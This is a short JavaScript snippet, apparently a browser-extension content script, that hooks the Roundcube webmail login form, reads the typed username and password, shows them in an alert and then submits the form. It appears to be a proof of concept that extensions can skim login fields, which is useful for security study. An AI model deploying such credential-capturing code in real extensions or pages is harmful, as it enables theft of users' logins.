// This extension retrieves the typed username and password and then submits the form by changing the button type
document.addEventListener('DOMContentLoaded', (event) => {
    document.getElementById("rcmloginsubmit").setAttribute("type","button");
    document.getElementById("rcmloginsubmit").addEventListener('click',(event) => {
        uname = document.getElementById("rcmloginuser").value;
        upass = document.getElementById("rcmloginpwd").value;
        alert(uname+" has password "+upass);
        document.getElementsByTagName("form")[0].submit();
    });
});
